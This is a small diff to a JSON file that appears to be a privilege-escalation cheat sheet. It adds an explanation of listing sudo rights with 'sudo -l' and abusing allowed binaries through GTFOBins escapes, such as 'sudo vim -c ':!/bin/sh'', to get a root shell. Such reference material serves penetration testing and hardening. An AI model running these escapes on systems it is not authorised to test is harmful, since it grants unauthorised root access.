@@ -115,5 +115,6 @@
       "label": "Abuse an allowed binary to get a root shell",
       "command": "# e.g. sudo vim -c ':!/bin/sh'  |  sudo less /etc/profile then !/bin/sh"
     }
-  ]
+  ],
+  "explain": "Lists sudo rights, then turns an allowed binary into root via GTFOBins:\n  sudo -l                  show which commands you may run as root\nMany binaries (vim, less, tcpdump, openssl, ...) have documented sudo escapes on GTFOBins - e.g. sudo vim -c ':!/bin/sh' gives a root shell. Look up each allowed binary there."
 }
